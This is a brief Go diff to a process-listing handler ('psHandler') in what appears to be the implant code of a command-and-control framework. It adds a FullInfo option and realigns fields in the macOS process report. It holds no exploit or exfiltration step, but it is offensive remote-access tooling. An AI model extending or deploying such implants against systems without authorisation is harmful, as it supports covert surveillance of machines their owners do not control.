@@ -38,7 +38,7 @@ func psHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	procs, err := ps.Processes()
+	procs, err := ps.Processes(psListReq.FullInfo)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("failed to list procs %v", err)
@@ -51,10 +51,10 @@ func psHandler(data []byte, resp RPCResponse) {
 
 	for _, proc := range procs {
 		p := &commonpb.Process{
-			Pid:        int32(proc.Pid()),
-			Ppid:       int32(proc.PPid()),
-			Executable: proc.Executable(),
-			Owner:      proc.Owner(),
+			Pid:          int32(proc.Pid()),
+			Ppid:         int32(proc.PPid()),
+			Executable:   proc.Executable(),
+			Owner:        proc.Owner(),
 			Architecture: proc.Architecture(),
 		}
 		p.CmdLine = proc.(*ps.DarwinProcess).CmdLine()
